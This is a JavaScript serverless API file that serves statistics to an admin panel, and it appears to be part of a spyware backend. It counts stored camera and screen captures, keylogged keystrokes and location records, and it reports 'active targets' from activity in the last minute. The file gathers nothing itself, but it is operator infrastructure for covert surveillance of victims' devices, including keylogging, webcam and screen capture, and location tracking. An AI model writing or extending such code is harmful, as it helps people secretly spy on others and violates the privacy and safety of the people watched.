// api/stats.js - Statistiques pour le panneau admin
let kv = null;
try {
    const kvModule = await import('@vercel/kv');
    kv = kvModule.kv;
} catch (e) {
    console.log('KV not available');
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        let stats = {
            images: 0,
            keys: 0,
            location: 0,
            activeTargets: 0,
            lastActivity: null,
            storage: kv ? 'kv' : 'none'
        };
        
        if (kv) {
            try {
                const keys = await kv.lrange('data:list', 0, -1);
                
                for (const key of keys) {
                    const data = await kv.get(key);
                    if (data) {
                        if (data.type === 'camera' || data.type === 'screen') {
                            stats.images++;
                        } else if (data.type === 'keylog') {
                            stats.keys += (data.keys || '').length;
                        } else if (data.type === 'location') {
                            stats.location++;
                        }
                        
                        const timestamp = parseInt(key.split(':')[1]);
                        if (Date.now() - timestamp < 60000) {
                            stats.lastActivity = timestamp;
                        }
                    }
                }
                
                if (stats.lastActivity) {
                    stats.activeTargets = 1;
                }
            } catch (kvError) {
                console.error('KV Error:', kvError.message);
                stats.storage = 'kv-error';
            }
        }
        
        res.status(200).json(stats);
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ error: 'Internal server error', details: error.message });
    }
}
